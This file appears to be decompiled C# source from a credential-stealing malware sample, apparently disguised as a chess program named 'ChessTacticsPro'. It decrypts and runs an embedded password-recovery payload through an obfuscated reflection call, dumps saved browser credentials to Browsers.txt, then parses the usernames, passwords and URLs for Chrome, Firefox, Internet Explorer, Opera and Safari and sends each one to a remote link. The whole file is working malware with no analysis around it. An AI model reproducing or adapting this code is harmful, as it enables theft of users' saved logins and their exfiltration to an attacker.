using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;

// Token: 0x02000010 RID: 16
internal class RecoverBrowsers
{
	// Token: 0x06000048 RID: 72 RVA: 0x00003B78 File Offset: 0x00002B78
	public RecoverBrowsers()
	{
		this.R_List = this.ReadFile();
	}

	// Token: 0x06000049 RID: 73 RVA: 0x00003B8C File Offset: 0x00002B8C
	public void Chrome()
	{
		this.FandS("Chrome");
	}

	// Token: 0x0600004A RID: 74 RVA: 0x00003B9C File Offset: 0x00002B9C
	public void Firefox()
	{
		this.FandS("Firefox");
	}

	// Token: 0x0600004B RID: 75 RVA: 0x00003BAC File Offset: 0x00002BAC
	public void InternetExplorer()
	{
		this.FandS("Internet Explorer");
	}

	// Token: 0x0600004C RID: 76 RVA: 0x00003BBC File Offset: 0x00002BBC
	public void Opera()
	{
		this.FandS("Opera");
	}

	// Token: 0x0600004D RID: 77 RVA: 0x00003BCC File Offset: 0x00002BCC
	public void Safari()
	{
		this.FandS("Safari");
	}

	// Token: 0x0600004E RID: 78 RVA: 0x00003BDC File Offset: 0x00002BDC
	public void FandS(string Browser)
	{
		checked
		{
			try
			{
				int count = Regex.Matches(this.R_List, Regex.Escape("URL")).Count;
				for (int i = 0; i < count; i++)
				{
					string between = this.GetBetween(this.R_List, "User Name         : ", "\r\n", i);
					string between2 = this.GetBetween(this.R_List, "Password          : ", "\r\n", i);
					string between3 = this.GetBetween(this.R_List, "URL               : ", "\r\n", i);
					string between4 = this.GetBetween(this.R_List, "Web Browser       : ", "\r\n", i);
					if (this.Contains(between4, Browser))
					{
						Send.SendLog(ChessTacticsPro.P_Link, "Passwords", null, null, between4, between3, between, between2, null);
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600004F RID: 79 RVA: 0x00003CC0 File Offset: 0x00002CC0
	public bool Contains(string NameInList, string Compare)
	{
		return NameInList.Contains(Compare);
	}

	// Token: 0x06000050 RID: 80 RVA: 0x00003CE0 File Offset: 0x00002CE0
	public string ReadFile()
	{
		string result = null;
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Browsers.txt");
		try
		{
			if (!File.Exists(path))
			{
				Assembly assembly = (Assembly)typeof(Assembly).GetMethod(Strings.StrReverse("ylbmessAgnitucexEteG")).Invoke(null, null);
				ResourceManager resourceManager = new ResourceManager("Key", assembly);
				byte[] bytes = Encoding.Unicode.GetBytes("Password");
				string executablePath = Application.ExecutablePath;
				string cmd = "/stext " + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Browsers.txt");
				byte[] ƈƖƻƨÔ = (byte[])resourceManager.GetObject("RecoverBrowsers");
				Óµ.ØØØØ(executablePath, cmd, Encryption.RSMDecrypt(ƈƖƻƨÔ, bytes), false);
				while (!File.Exists(path))
				{
					Thread.Sleep(1000);
				}
			}
			result = File.ReadAllText(path);
		}
		catch (Exception ex)
		{
		}
		return result;
	}

	// Token: 0x06000051 RID: 81 RVA: 0x00003DDC File Offset: 0x00002DDC
	public string GetBetween(string input, string str1, string str2, int ind)
	{
		string input2 = Regex.Split(input, str1)[checked(ind + 1)];
		return Regex.Split(input2, str2)[0];
	}

	// Token: 0x04000023 RID: 35
	private string R_List;
}
